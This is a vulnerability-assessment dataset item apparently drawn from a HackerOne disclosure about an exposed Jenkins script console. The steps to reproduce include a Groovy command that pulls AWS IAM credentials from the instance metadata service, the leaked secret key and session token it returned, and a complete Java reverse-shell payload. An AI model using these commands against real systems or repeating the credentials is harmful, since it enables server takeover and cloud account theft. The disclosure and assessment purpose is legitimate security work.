# CMDI — h1

- source: h1
- class: cmdi
- cwe: CWE-77
- severity: critical
- program: deptofdefense
- quality_score: 12

## Scenario

Analyze the following vulnerability report and provide a structured security assessment.

**Report Title:**  Remote Code Execution and AWS IAM Credentials Exfiltration in https://████████/

**Vulnerability Description:**
**Description:**
The host https://██████/ has /jenkins/script directory enabled that allows user to execute system command in the host.


## References
https://hackerone.com/reports/768266

## Impact

Attacker can use the IAM credentials to manage various AWS resources, create and delete resources, read and write data in AWS services,  create and manage other IAM users and roles, access the AWS Management Console, use the AWS Command Line Interface (CLI). In addition, attacker can obtain a reverse shell and takeover the vulnerable server.

## System Host(s)
█████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
1. Go to https://███/jenkins/script and enter the following command and click on run. 

println "curl http://[REDACTED_PHONE]/latest/meta-data/iam/security-credentials/AmazonSSMRoleForInstancesQuickSetup".execute().text

```
{
  "Code" : "Success",
  "LastUpdated" : "[REDACTED_PHONE]T15:06:03Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "[REDACTED_TOKEN]",
  "SecretAccessKey" : "zktjDluq7fiPeRPZ/Ptdj0f/RpifcpiverrHZPY9",
  "Token" : "FwoDYXdzEC4aDOSTrvC1+12bsyz/YCLpBJSWuycc/qloo+gbOS0H0HDHj+qAV6rldadbawPMkpUC2kyF9UW3rayH29j3MQNMDDxoPZTpnWLYuIbBl1iaYciwrOVemd6OTSDTyoAz9JjO1Cc3svhv58rhTx1c+FWpQKxtOgiLPEJWT/sPfdEJDAcLoXfyDi7lLWD5ydyHuKWngG8ZBG/5Ik170XOpYeZpSpJ/pspBNnzbf5dPJo/QVNWN+hoY8+WrK4Hko7y04Z/ZwJWO3Q6DYVM2OSARheKUnih8NrX6pROliySxRzj3fedhz2h95axbt+up+HwvszZv+ksQmZdAOFL4iI8oXWF6RgWz7Mkyot+o+Zk4fKRBZOad0iDg0NjaNvZSOWHCx+Bd55lq/rMmthcYubHgGtLXS8F9cJShYjysU9pDK9M7Hd644KmSVgvRe0pCV4GgwOAqKdSYVQn7A2cBeO4ROL712adCz8wzYDMRavHK8mfeKCd5qAfrd7z7BGIiaIeEYJ52CglOpUFywMnlmPNN1V/Rvih1YX0Ndq0yNso9Rj1FUtiLTWysCkm/YGCK68TILlEX7UaJV3keGpMkpCULsGkcH23RZmp8NjYoIf7okJ28ygVW4GYWF48MWVm96HWDRGJ951x3IOIZBdOhgKrVRQJLUXgVjDwm1QroAyYTRSiLw9YrR5jmN6ONfYnyh06qpl1PUz8C1+iXtRQIjzWjaaHLh2YQERTIo/ejCERtoM/AEjhB6DhdlroSvuPNjD03NPYtxd87vUuG7gsZSYqXOOsU3sYiJra3UrbA9vFR/BmnJcXbxcsWMtCCs9syRp9r+2V3qT6ppN2i5Im9KI/K/6UGMkHbC2LUgZo1VIbWCrN+ePxqijy1CUe9r98gOm9Z2rxKQ+CfKjPJo0nvYc3Z8UmxqKpeG2dtOpW8OYuQZivCMR5ifg==",
  "Expiration" : "[REDACTED_PHONE]T21:32:22Z"
}
```

2. IAM Credentials will be disclosed.

3. To get a reverse shell use this command.

## In vulnerable host

```
String host="your_server_ip";
int port=1337;
String cmd="bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

##

## Analysis / Response

**Vulnerability Class:** cmdi
**CWE:** CWE-77
**Weakness:** Command Injection - Generic
**Severity:** critical
**Endpoint Pattern:** https://██████/

**Impact Assessment:**
Attacker can use the IAM credentials to manage various AWS resources, create and delete resources, read and write data in AWS services,  create and manage other IAM users and roles, access the AWS Management Console, use the AWS Command Line Interface (CLI). In addition, attacker can obtain a reverse shell and takeover the vulnerable server.

## System Host(s)
█████

## Affected Product(s) and Version(s)


## CVE Numbers

**Remediation:**
Avoid passing user input to system commands. Use language-native APIs instead of shell execution. If unavoidable, use strict allowlists for permitted values.
